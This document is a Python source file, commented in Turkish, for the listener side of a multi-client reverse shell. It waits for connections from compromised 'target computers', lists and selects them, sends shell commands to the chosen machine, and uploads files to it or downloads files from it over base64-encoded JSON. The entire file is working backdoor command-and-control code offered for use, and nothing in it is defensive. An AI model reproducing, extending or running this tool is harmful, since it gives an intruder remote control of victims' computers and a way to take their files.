#!/usr/bin/env python 3.7.2
# -*- coding: utf-8 -*-
import socket
import json
import base64
from queue import Queue
import threading
import os
from termcolor import colored
import sys

class Listener:
    def __init__(self,ip,port):
        self.about()
        self.threads = 2
        self.jobs = [1, 2]
        self.queue = Queue()
        self.ip=ip
        self.port=port
        self.baglantilar = []
        self.adresler = []
        self.connection=None
        self.aktif_hedef=None
        self.quit=True
        self.cwd=None
        self.cwd_durum=True
        self.komutlar = {'help:': "Uygulama kullanımı hakkında bilgi verir.",
                         'list:': "Bağlantı sağlayan bilgisayarları listeler.",
                         'select:': "Bağlantı sağlayan bilgisayarları seçmek için kullanılır.Seçim işlemi listelenen bilgisayarların index numaralarına göre yapılır.",
                         'quit:': "Seçilmiş olan  bilgisayardan bağlantıyı durdurmak için kullanılır.",
                         'exit:': "Serverin çalışmasını durdurur.Uygulamadan çıkış yapar.",
                         'upload:': "Seçilen hedef makineye dosya yüklenmesini sağlar.Hedef bilgisayar seçildikten sonra bu komut çalışır.",
                         'download:': "Seçilen hedef makineden dosya indirilmesini sağlar.Hedef bilgisayar seçildikten sonra bu komut çalışır.",
                    }
        print(self.uyari_renk("[+] Server Başlatıldı.",1))
        print(self.uyari_renk("[+] Gelen bağlantılar bekleniliyor...",1))


    def yardim(self):
        for komut, aciklama in self.komutlar.items():
            print(self.uyari_renk(komut, 1) + "\t" + aciklama)

    def uyari_renk(self,mesaj,durum):
        if durum==1:
            return colored(mesaj,"green")
        elif durum==2:
            return colored(mesaj,"red")
        elif durum==3:
            return colored(mesaj,"blue")


    def thread_olustur(self):
        for _ in range(self.threads):
            work = threading.Thread(target=self.gorev)
            work.daemon = True
            work.start()

    def gorev(self):
        while True:
            x = self.queue.get()
            if x == 1:
                self.socket_dinle()
            if x == 2:
                self.listener_komut_calistir()
            try:
                self.queue.task_done()
            except:
                pass

    def gorev_olustur(self):
        for job in self.jobs:
            self.queue.put(job)
        self.queue.join()

    def socket_dinle(self):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        for baglanti in self.baglantilar:
            baglanti.close()
        self.baglantilar = []
        self.adresler = []
        while 1:
            try:
                baglanti, adres = listener.accept()
                baglanti.setblocking(1)
                adres = adres + (str(baglanti.recv(1024), "utf-8"),)
                self.baglantilar.append(baglanti)
                self.adresler.append(adres)
                print(self.uyari_renk("\n[+] " + adres[-1] + " (" + adres[0] + ")" + " adresinden bağlantı kuruldu",1))

                if self.quit==True:
                    print(self.uyari_renk("listener >> ",3),end="")
                else:
                    if self.connection.getpeername()[0]==baglanti.getpeername()[0]:
                        self.cwd_durum = False
                        self.aktif_baglanti_kes(False)
                    else:
                        self.cwd=self.komut_yurut(["getcwd"])
                        print(self.uyari_renk(self.cwd,3),end="")
            except Exception as e:
                print(self.uyari_renk("[-] Hedefe bağlantı sırasında hata oluştu",2))
                print(self.uyari_renk("[-] Hata mesajı:"+str(e),2))
                self.cwd_durum = False
                self.aktif_baglanti_kes(False)

    def listener_komut_calistir(self,durum=True):
        while durum:
            komut = input(self.uyari_renk('listener >> ', 3))
            if komut == 'list':
                self.listele()
            elif "select" in komut:
                if len(komut.split(" "))>1:
                    self.connection,self.aktif_hedef = self.hedef_sec(komut)
                    if self.connection is not None:
                        self.quit=False
                        self.backdoor_komut_calistir()
                else:
                    print(self.uyari_renk("[-] Lütfen bir hedef seçimi yapınız!",2))
            elif komut == "help":
                self.yardim()
            elif komut == 'exit':
                try:
                    self.queue.task_done()
                    self.queue.task_done()
                except:
                    continue
                print(self.uyari_renk("[*] Server'dan çıkış yapıldı",1))
                break
            else:
                print(self.uyari_renk("[-] Komut işlenemedi!",2))
                print(self.uyari_renk("[*] Uygulama kullanımı için 'help' komutunu giriniz!", 2))
        if self.cwd_durum == False:
            print(self.cwd,end="")
            self.cwd_durum = True

    def listele(self,durum=True):
        sonuc = ''
        for i, baglanti in enumerate(self.baglantilar):
            try:
                baglanti.send(str.encode(" "))
            except Exception:
                del self.baglantilar[i]
                del self.adresler[i]
                continue
            if durum:
                sonuc += str(i) + "\t" + str(self.adresler[i][0]) + "\t" + str(self.adresler[i][1]) + "\t" + str(self.adresler[i][2]) + "\n"
        if durum:
            print(self.uyari_renk("*_______________Clients________________*",3))
            print(self.uyari_renk("index\tIp Adresi\tPort\tHostname",3))
            print(self.uyari_renk(sonuc,1))

    def hedef_sec(self,index):
        try:
            index = index.replace('select ', '')
            index = int(index)
        except:
            print(self.uyari_renk("[-] Lütfen geçerli bir hedef seçiniz",2))
            return None,None
        try:
            baglanti = self.baglantilar[index]
            baglanti.send(str.encode(" "))
            print(self.uyari_renk("[+] " + str(self.adresler[index][2]) + " (" + str( self.adresler[index][0]) + ") bilgisayarına bağlandınız",1))
            return baglanti,index

        except:
            if len(self.baglantilar) > index:
                del self.baglantilar[index]
                del self.adresler[index]
            print(self.uyari_renk("[-] Lütfen geçerli bir hedef seçiniz",2))
            return None,None


    def aktif_baglanti_kes(self,durum=True):
        self.aktif_baglanti_sifirla()
        self.listele(False)
        if durum:
            self.listener_komut_calistir()
        else:
            self.listener_komut_calistir(False)

    def aktif_baglanti_sifirla(self):
        self.connection=None
        self.quit=True
        if self.aktif_hedef:
            del self.baglantilar[self.aktif_hedef]
            del self.adresler[self.aktif_hedef]
            self.aktif_hedef=None


    def komut_yurut(self, komut):
        try:
            if self.connection:
                self.gonder(komut)
                return self.al()
            else:
                print(self.uyari_renk("[-] Üzerinde işlem yaptığınız hedef bilgisayarın bağlantısı kesildi...", 2))
                print(self.uyari_renk("[-] Bağlantı Kapatıldı!", 2))
                self.aktif_baglanti_sifirla()
        except Exception as e:
            print(self.uyari_renk("[-] Üzerinde işlem yaptığınız hedef bilgisayarın bağlantısı kesildi...", 2))
            print(self.uyari_renk("[-] Hata mesajı: " + str(e), 2))
            print(self.uyari_renk("[-] Bağlantı Kapatıldı!", 2))
            self.aktif_baglanti_sifirla()


    def gonder(self,veri):
        json_veri = json.dumps(veri)
        self.connection.send(str.encode(json_veri))

    def al(self):
        json_veri = ""
        while True:
            try:
                json_veri = json_veri + str(self.connection.recv(1024),"utf-8")
                return json.loads(json_veri)
            except ValueError:
                continue
            except:
                break

    def dosya_kontrol(self, dosya):
        return os.path.isfile(path=dosya)

    def dosya_yaz(self,path,content):
        try:
            with open(path,"wb") as file:
                file.write(base64.b64decode(content))
                return self.uyari_renk("[+] İndirme Başarılı!",1)
        except Exception as e:
            return self.uyari_renk("[-] Dosya indirme işlemi başarısız!"+"\n[-] Hata mesajı:"+str(e),2)

    def dosya_oku(self, dosya):
        try:
            with open(dosya, "rb") as file:
                return str(base64.b64encode(file.read()),"utf-8")
        except Exception as e:
            return self.uyari_renk("[-] Dosya yükleme işlemi başarısız \n[-] Hata mesajı:"+str(e),2)

    def backdoor_komut_calistir(self):
        cwd=self.al()
        if cwd:
            print(self.uyari_renk(cwd,3), end="")

        while not self.quit:
            try:
                durum = True
                komut = input("")
                if komut:
                    komut = komut.split(" ")
                    if komut[0] == "upload":
                        if len(komut) > 1:
                            if self.dosya_kontrol(komut[1]):
                                dosya = self.dosya_oku(komut[1])
                                komut.append(dosya)
                            else:
                                sonuc = self.uyari_renk("[-] Yüklemek için, '" + komut[1] + "' adında bir dosya bulunmamaktadır!",2)
                                durum = False
                        else:
                            sonuc = self.uyari_renk("[-] Lütfen yüklenecek dosyayı belirtiniz!",2)
                            durum = False

                    if komut[0] == "download":
                        if len(komut) > 1:

                            sonuc = self.komut_yurut(komut)
                            if sonuc:
                                self.cwd=sonuc[sonuc.rfind("\n\n"):]
                    elif durum:
                        sonuc = self.komut_yurut(komut)
                        if sonuc:
                            self.cwd=sonuc[sonuc.rfind("\n\n"):]
                    else:
                        self.cwd = self.komut_yurut(["getcwd"])
                        sonuc += self.cwd

                    if komut[0] == "download":
                        if len(komut) > 1:
                            if "[-]" not in sonuc:
                                sonuc = self.dosya_yaz(komut[1], sonuc)
                        else:
                            sonuc = self.uyari_renk("[-] Lütfen indirilecek dosyayı belirtiniz!",2)

                    elif komut[0] == "quit":
                        break
                else:
                    self.cwd=self.komut_yurut(["getcwd"])
                    sonuc = self.uyari_renk(self.cwd, 3)

                if sonuc:
                    print(sonuc, end='')
                    if komut:
                        if komut[0] == "download":
                            self.cwd = self.komut_yurut(["getcwd"])
                            print(self.uyari_renk(self.cwd,3), end='')

            except Exception as e:
                print(self.uyari_renk("[-] Komut yürütme sırasında hata: "+ str(e),2))

        print("\n[*] Çıkış Yapıldı")
        self.aktif_baglanti_sifirla()

    def about(self):
        print(self.uyari_renk("  _____                                 _____ _          _ _ ", 1))
        print(self.uyari_renk(" |  __ \                               / ____| |        | | |", 1))
        print(self.uyari_renk(" | |__) |_____   _____ _ __ ___  ___  | (___ | |__   ___| | |", 1))
        print(self.uyari_renk(" |  _  // _ \ \ / / _ \ '__/ __|/ _ \  \___ \| '_ \ / _ \ | |", 1))
        print(self.uyari_renk(" | | \ \  __/\ V /  __/ |  \__ \  __/  ____) | | | |  __/ | |", 1))
        print(self.uyari_renk(" |_|  \_\___| \_/ \___|_|  |___/\___| |_____/|_| |_|\___|_|_|", 1))
        print(self.uyari_renk("# ==============================================================================",1))
        print(self.uyari_renk("# author      	:", 1) + "Mustafa Dalga")
        print(self.uyari_renk("# website    	:", 1) + "https://apierson.com")
        print(self.uyari_renk("# linkedin    	:", 1) + "https://www.linkedin.com/in/mustafadalga")
        print(self.uyari_renk("# github      	:", 1) + "https://github.com/mustafadalga")
        print(self.uyari_renk("# email      	:", 1) + "mustafadalgaa < at > gmail[.]com")
        print(self.uyari_renk("# description 	:", 1) + "Hedef bilgisayarlardan gelen birden fazla bağlantıya izin veren ,çoklu istemcili reverse shell.")
        print(self.uyari_renk("# date        	:", 1) + "29.06.2019")
        print(self.uyari_renk("# version     	:", 1) + "1.0")
        print(self.uyari_renk("# python_version:", 1) + "3.7.2")
        print(self.uyari_renk("# ==============================================================================",1))

try:
    listener = Listener('',2019)
    listener.thread_olustur()
    listener.gorev_olustur()
except:
    print(listener.uyari_renk("\n\n[*] Server'dan çıkış yapıldı",1))
    sys.exit()
